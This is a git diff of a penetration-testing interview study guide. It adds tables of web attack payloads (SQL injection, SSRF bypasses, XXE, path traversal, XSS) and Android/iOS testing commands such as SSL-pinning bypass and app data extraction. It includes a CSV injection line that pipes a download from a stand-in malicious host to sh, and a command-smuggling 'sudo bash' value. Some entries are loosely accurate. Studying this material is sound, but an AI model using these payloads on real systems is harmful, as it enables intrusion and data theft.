@@ -4,7 +4,7 @@
 # Web Application
 ---
 
-**Most Common Questions:**
+### **Most Common Questions:**
 
 - SQL injection and it's type
 - SSRF and bypass
@@ -19,6 +19,32 @@
 - How to connect proxy with mobile
 - SSRF exploit LFI, RFI, or command injection, port scan etc.
 >
+
+
+## Web Application Security Quick Revision
+
+| **Topic**                        | **Description**                                                                                                         | **Example Payloads**          |
+|----------------------------------|-------------------------------------------------------------------------------------------------------------------------|--------------------------------|
+| **SQL Injection**                | Attacker manipulates SQL queries to gain unauthorized access or control over the database. Types include In-Band, Inferential, and Out-of-Band. | `1' OR '1'='1`, `UNION SELECT * FROM users` |
+| **SSRF (Server-Side Request Forgery)** | Server-Side Request Forgery (SSRF) is a security vulnerability where an attacker tricks a server into making requests to internal or external resources that the attacker cannot access directly. This can allow the attacker to access restricted data or services within the server’s network.  | Common bypass techniques include:<br>- **Whitelisted Domains Bypass**:<br>  - Protocols: `file://` (e.g., `file:///etc/passwd`), `SFTP://` (e.g., `sftp://generic.com`)<br>  - Bypass by HTTPS (e.g., `https://127.0.0.1/` as `https://localhost/`)<br>  - URL Encoding (e.g., `http://127.0.0.1/%61dmin`)<br>  - Decimal IP (e.g., `192.168.1.1` as `3232235777`)<br>  - Octal IP (e.g., `192.168.1.1` as `0300.0250.01`) `http://localhost:8080/admin`, `http://169.254.169.254/latest/meta-data/` |
+| **XML Attack**                   | Exploits vulnerabilities in XML parsers, such as XML External Entity (XXE) attacks and XML Injection.                  | `<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]><foo>&xxe;</foo>` |
+| **Login Page Scenarios**         | Various attacks on login pages: SQL Injection, Host Header Injection, URL Redirection, Username Enumeration, Rate Limiting/Brute Force. | `admin' OR '1'='1`, `http://example.com?redirect=http://malicious.com`, `admin@domain.com` |
+| **Billion Laughs Attack**        | XML Bomb attack that causes resource exhaustion by creating deeply nested XML entities.                                 | `<!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol1 "&lol;"><!ENTITY lol2 "&lol1;"> ...` |
+| **Deserialization Vulnerability** | Exploits insecure deserialization of objects, leading to remote code execution or other attacks.                        | `O:12:"SomeClass":1:{s:4:"prop";s:10:"malicious_code";}` |
+| **Directory Traversal**          | Exploits path traversal vulnerabilities to access directories and files outside the intended directory.                 | `../etc/passwd`, `../../../../etc/shadow` |
+| **LFI (Local File Inclusion)**   | Attacker includes local files on the server, potentially leading to exposure of sensitive information.                  | `file:///etc/passwd`, `../config.php` |
+| **RFI (Remote File Inclusion)**  | Attacker includes remote files from an external server, which may lead to remote code execution.                         | `http://malicious.com/malicious_script.php` |
+| **SSRF Exploits**                | Exploiting SSRF to perform LFI, RFI, command injection, port scanning, etc., by manipulating server-side requests.       | `http://localhost:8000/admin`, `http://127.0.0.1:8080/`, `http://example.com?param=..%2F..%2F..%2Fetc%2Fpasswd` |
+| **Tabnabbing**                   | Phishing technique where an attacker manipulates a tab or window to deceive users into entering sensitive information. | N/A (no specific payload, requires technique) |
+| **Cache Poisoning**              | Attacker manipulates cached responses to serve malicious content or bypass security controls.                            | `Cache-Control: no-store`, `X-Original-URL: http://malicious.com` |
+| **DOM XSS (Document Object Model XSS)** | Exploits vulnerabilities in client-side scripts to execute malicious code in the user's browser. Simplified as: attacker manipulates the DOM environment to inject and execute scripts. | `javascript:alert('XSS')`, `<img src="x" onerror="alert('XSS')">` |
+| **CSV Injection**                | Attacker injects malicious code into CSV files which can be executed when the file is opened in spreadsheet applications. | `=cmd|'/C calc'!A0`, `;wget http://malicious.com/malware -O- | sh` |
+| **Parameter Pollution**          | Attacker manipulates URL or request parameters to bypass filters or alter application behavior.                         | `?id=1&id=2`, `?search=valid&search=malicious` |
+| **SSRF Bypass Techniques**       | Various methods to bypass SSRF protections, such as using alternative protocols or obfuscation techniques.              | `http://localhost%2Fadmin`, `http://127.0.0.1:8080%2Fadmin` |
+| **Privilege Escalation**         | Techniques used by attackers to gain higher-level access within an application or system. Methods include exploiting insecure permissions, bypassing access controls, or exploiting vulnerabilities. | `id=1; sudo bash`, `?user=admin` |
+| **BOLA vs IDOR**                 | **BOLA (Broken Object Level Authorization)**: Access control issues allowing unauthorized access to objects.<br>**IDOR (Insecure Direct Object References)**: Direct access to objects without proper authorization checks. | `?documentId=123`, `?fileId=456` |
+| **Methods of Privilege Escalation** | Techniques include exploiting vulnerabilities in user roles, accessing unauthorized resources, privilege misconfigurations, or bypassing role-based access controls. | `admin`, `role=superuser` |
+| **Login Page Testing**           | Tests include:<br>- **SQL Injection**: Inject SQL code into login fields.<br>- **Host Header Injection**: Manipulate headers to redirect or inject content.<br>- **URL Redirection**: Test for unauthorized redirection.<br>- **Username Enumeration**: Check if usernames are exposed.<br>- **Rate Limiting/Brute Force**: Attempt to bypass rate limits to perform brute force attacks. | `admin' OR '1'='1`, `http://example.com?redirect=http://malicious.com`, `admin@domain.com` |
 
 ### SQL Injection and Its Types
 
@@ -128,33 +154,12 @@ include a file from a remote server and execute it on your server
 
 ##### SSRF
 
-Server-side request forgery is a web security vulnerability that allows an attacker to force the server-
-side application to make requests to an unintended location
-Common Bypass technique:
 
-**Whitelisted Domains Bypass**
-
-- Protocols:
-    o file:// - file:///etc/passwd
-    o SFTP:// url=sftp://generic.com:
-- Bypass by HTTPS [ https://127.0.0.1/ - > https://localhost/ ]
-- URL encoding - [http://127.0.0.1/%61dmin](http://127.0.0.1/%61dmin)
-- Double URL Encoding -
-- Decimal IP - 192.168.1.1 - 3232235777
-- Ocotal IP - 192.168.1.1 - 0300.0250.01.
-Mitigation:
-- **Input Whitelisting** : Implement strict input validation and enforce a whitelist of allowed
-domains or resources that your application can access. Only trusted and necessary domains
-should be permitted.
-- **URL Normalization** : Normalize URLs before processing to remove any obfuscation
-techniques or redundant encoding. Tools like the url-normalize library can help in this
-regard.
---
 
 
 ---
 ---
-# Android Application
+# Android and iOS Pentesting :
 ---
 
 Android architecture contains different number of components to support any android device
@@ -368,6 +373,48 @@ decompilation, scripting, and collaborative reverse engineering, making it suita
 | **Method 3: Android Studio Emulator** | **Android**       | 1. Open Android Studio.<br>2. Go to **AVD Manager**.<br>3. Click the **Edit** (pencil) icon next to the emulator.<br>4. In the **Emulated Performance** section, click **Show Advanced Settings**.<br>5. Scroll down to the **Proxy** section.<br>6. Select **Manual proxy configuration**.<br>7. Enter the IP address and port of Burp Suite (default: `8080`).<br>8. Click **Finish** and restart the emulator if needed.<br>9. Verify by checking Burp Suite’s **Proxy** tab for intercepted traffic. | Configure the Android emulator in Android Studio to use Burp Suite as a proxy. |
 | **Method 4: Genymotion**          | **Android**           | 1. Open Genymotion.<br>2. Go to **Settings**.<br>3. Navigate to **Proxy**.<br>4. Select **Manual proxy configuration**.<br>5. Enter the IP address and port of Burp Suite (default: `8080`).<br>6. Click **Apply** and restart the emulator if needed.<br>7. Verify by checking Burp Suite’s **Proxy** tab for intercepted traffic. | Configure the Genymotion emulator to use Burp Suite as a proxy. |
 | **Method 5: NoxPlayer**           | **Android**           | 1. Open NoxPlayer.<br>2. Go to **Settings**.<br>3. Navigate to **Proxy Settings**.<br>4. Select **Manual Proxy Configuration**.<br>5. Enter the IP address and port of Burp Suite (default: `8080`).<br>6. Click **Save** and restart the emulator if needed.<br>7. Verify by checking Burp Suite’s **Proxy** tab for intercepted traffic. | Configure NoxPlayer emulator to use Burp Suite as a proxy. |
+
+
+
+## Android Penetration Testing Interview Questions
+## Android Penetration Testing Interview Questions
+
+| **Question**                                                                                                 | **Description**                                                                                                  | **Command/Payload**                                                                                      |
+|-------------------------------------------------------------------------------------------------------------|------------------------------------------------------------------------------------------------------------------|-----------------------------------------------------------------------------------------------------------|
+| What is ADB and how is it used in Android penetration testing?                                             | ADB (Android Debug Bridge) is a command-line tool that enables communication with an Android device or emulator. It is used for tasks such as installing and debugging apps, accessing the file system, and running commands. | `adb shell` <br> `adb install <app.apk>` <br> `adb pull /data/data/com.example.app/shared_prefs/` |
+| How do you perform static analysis on an Android application?                                                | Static analysis involves decompiling the APK using tools like JADX or Apktool to examine the app’s code and resources. This helps identify vulnerabilities such as insecure data storage, improper permissions, and hardcoded secrets. | `jadx-gui <app.apk>` <br> `apktool d <app.apk>` |
+| What is SSL pinning and how can it be bypassed in Android applications?                                     | SSL pinning is a security measure that ensures an app only accepts certificates from specific servers. Bypass techniques include using tools like Frida or Objection to intercept and modify SSL/TLS methods or modifying the app to bypass pinning checks. | `frida -U -p <pid> -l bypass_ssl_pinning.js` <br> `objection --gadget <app> explore` |
+| What are the main components of an Android application?                                                     | The main components are Activities, Services, Broadcast Receivers, and Content Providers. These components define the app’s structure and functionality.                                        | N/A                                                                                                       |
+| What is an APK file?                                                                                          | An APK (Android Package Kit) is the file format used for distributing and installing Android applications.                                                   | N/A                                                                                                       |
+| What is the AndroidManifest.xml file and what information does it contain?                                  | The AndroidManifest.xml file is a configuration file that declares the app’s components, permissions, and other settings. It is essential for defining the app's behavior and security.    | `apktool d <app.apk>` <br> `cat <app>/AndroidManifest.xml` |
+| How do you enumerate an Android application for vulnerabilities?                                             | Enumeration involves gathering information about the app’s components, permissions, exposed services, and potential attack vectors using tools and techniques like static and dynamic analysis, network monitoring, and reverse engineering. | `drozer console connect` <br> `drozer runmodule exploits.missingapp` |
+| How do you bypass SSL pinning in a Flutter application?                                                       | To bypass SSL pinning in a Flutter app, you can use Frida or Objection to hook into network security methods, or modify the app’s code to disable SSL pinning mechanisms. | `frida -U -p <pid> -l bypass_ssl_pinning_flutter.js` <br> `objection --gadget <app> explore` |
+| What are common static vulnerabilities found during static analysis of Android applications?                | Common vulnerabilities include hardcoded secrets (API keys, passwords), insecure data storage (in plaintext), improper permissions (overly broad permissions in AndroidManifest.xml), and insecure communication (unencrypted or weakly encrypted data). | `grep -r 'password' .` <br> `grep -r 'api_key' .` |
+| What are some tools used for Android penetration testing?                                                     | Common tools include JADX (for decompiling APKs), Apktool (for reverse engineering), Burp Suite (for intercepting HTTP/S traffic), Frida (for dynamic analysis and hooking), and Drozer (for vulnerability scanning). | `jadx-gui <app.apk>` <br> `apktool d <app.apk>` <br> `burpsuite` <br> `frida-server` <br> `drozer console connect` |
+| What is root and how can it be bypassed in Android applications?                                            | Root access provides elevated permissions on an Android device. Bypassing root protections may involve exploiting vulnerabilities, using custom firmware, or leveraging tools like Magisk for systemless root. | `adb root` <br> `adb shell su` <br> `magisk` |
+| What is Intent Spoofing and how can it be exploited?                                                         | Intent Spoofing involves sending unauthorized intents to components of an Android app. Exploits can lead to unauthorized actions or data access. | `adb shell am broadcast -a com.example.broadcast.MY_NOTIFICATION --ez "extra" true` |
+| What is Insecure Data Storage and how can it be detected?                                                     | Insecure Data Storage involves storing sensitive data in unprotected locations, such as plaintext files or shared preferences. Detection involves examining where data is stored and assessing its protection. | `adb pull /data/data/com.example.app/shared_prefs/` <br> `adb shell cat /data/data/com.example.app/files/secret.txt` |
+| What is WebView Vulnerability and how can it be exploited?                                                    | WebView vulnerabilities occur when an app uses WebView to load untrusted content. Exploits can involve JavaScript injection or accessing sensitive app data. | `javascript:alert('XSS')` <br> `adb shell dumpsys webview` |
+
+## iOS Penetration Testing Interview Questions
+
+| **Question**                                                                                                 | **Description**                                                                                                  | **Command/Payload**                                                                                      |
+|-------------------------------------------------------------------------------------------------------------|------------------------------------------------------------------------------------------------------------------|-----------------------------------------------------------------------------------------------------------|
+| What is an IPA file and how is it used in iOS penetration testing?                                          | An IPA (iOS App Store Package) file is the format used for distributing and installing iOS applications. In penetration testing, you analyze IPA files by decompiling them with tools like class-dump or Hopper to examine their structure and code for vulnerabilities. | `class-dump <app.ipa>` <br> `dumpdecrypted <app.ipa>` |
+| What is the Info.plist file and what information does it contain?                                           | The Info.plist file contains metadata about the app, including permissions, supported architectures, and configuration settings. It is essential for understanding the app’s capabilities and security requirements.                                        | `strings <app.ipa> | grep 'Info.plist'` |
+| How do you perform static analysis on an iOS application?                                                    | Static analysis involves decompiling the IPA file using tools like Hopper or IDA Pro to analyze the app's binary code. This helps identify vulnerabilities such as insecure data storage, improper permissions, and code-level issues.                | `class-dump <app.ipa>` <br> `hopper <app.ipa>` |
+| What is SSL pinning and how can it be bypassed in iOS applications?                                         | SSL pinning ensures the app only trusts specific certificates. Bypass techniques include using tools like Frida or Cycript to hook into SSL/TLS methods or modifying the app's code to disable pinning checks, allowing for traffic interception and analysis. | `frida -U -p <pid> -l bypass_ssl_pinning.js` <br> `cycript -p <app>` |
+| What methods are used for reverse engineering an iOS application?                                            | Methods include decompiling the IPA file, analyzing the binary with disassemblers like Ghidra or IDA Pro, and examining the app’s runtime behavior using tools like Cycript or Frida.                             | `class-dump <app.ipa>` <br> `ghidra` <br> `ida <app.ipa>` |
+| What are entitlements in an iOS application?                                                                  | Entitlements are special permissions granted to an app to access certain system resources or services, such as Keychain access or iCloud. They control what the app can do and access on the device.                                              | `security dump-keychain -d` <br> `strings <app.ipa> | grep 'entitlements'` |
+| How do you enumerate an iOS application for vulnerabilities?                                                 | Enumeration involves analyzing the app’s structure, permissions, exposed APIs, and network communication using static and dynamic analysis techniques. Tools include class-dump, Hopper, and network analyzers. | `class-dump <app.ipa>` <br> `networksetup -listallhardwareports` |
+| What are common static vulnerabilities found during static analysis of iOS applications?                    | Common vulnerabilities include hardcoded secrets (API keys, passwords), insecure data storage (in plaintext), improper permissions (overly broad entitlements), and insecure communication (unencrypted or weakly encrypted data). | `grep -r 'password' .` <br> `grep -r 'api_key' .` |
+| What are some tools used for iOS penetration testing?                                                         | Common tools include class-dump (for extracting class information), Hopper (for disassembling binaries), Frida (for dynamic analysis and hooking), Cycript (for runtime analysis), and Burp Suite (for intercepting HTTP/S traffic). | `class-dump <app.ipa>` <br> `hopper <app.ipa>` <br> `frida-server` <br> `cycript` <br> `burpsuite` |
+| What is jailbreak and how can it be bypassed in iOS applications?                                          | Jailbreaking provides elevated access to iOS devices. Bypassing jailbreak protections may involve using tools like Cydia or uncovering exploits that bypass restrictions. For testing, jailbroken devices can be used to access restricted areas or functions. | `Cydia` <br> `unc0ver` <br> `checkra1n` |
+| What is Code Injection and how can it be exploited in iOS apps?                                             | Code Injection involves inserting malicious code into an application to alter its behavior. Exploits can include modifying app binaries or injecting code at runtime using tools like Frida. | `frida -U -p <pid> -l code_injection.js` |
+| What is insecure direct object reference (IDOR) and how can it be exploited in iOS apps?                   | IDOR occurs when an app exposes internal objects (e.g., files or database entries) directly to users without proper authorization checks. Exploits can involve accessing or manipulating these objects via predictable URLs or parameters. | `curl -X GET 'https://api.example.com/data/123'` |
+
+
+
 
 ---
 ---
